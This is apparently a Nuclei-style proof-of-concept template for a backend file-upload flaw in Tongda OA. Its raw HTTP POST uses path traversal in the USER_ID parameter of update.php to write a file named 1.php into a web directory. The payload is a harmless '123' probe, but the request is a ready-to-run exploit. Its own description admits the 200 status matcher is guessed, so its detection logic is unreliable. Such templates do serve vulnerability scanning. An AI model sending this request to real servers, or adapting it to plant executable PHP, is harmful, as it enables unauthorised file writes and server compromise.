id: poc-9fb6b97231fbee837aa8
info:
  name: 通达OAupdate存在后台文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/1.php HTTP/1.1

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0

    Cookie: {cookie}

    Content-Type: multipart/form-data; boundary=00content0boundary00

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 203

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="ATTACHMENT"; filename="."


    123

    --00content0boundary00

    Content-Disposition: form-data; name="submit"


    保存

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
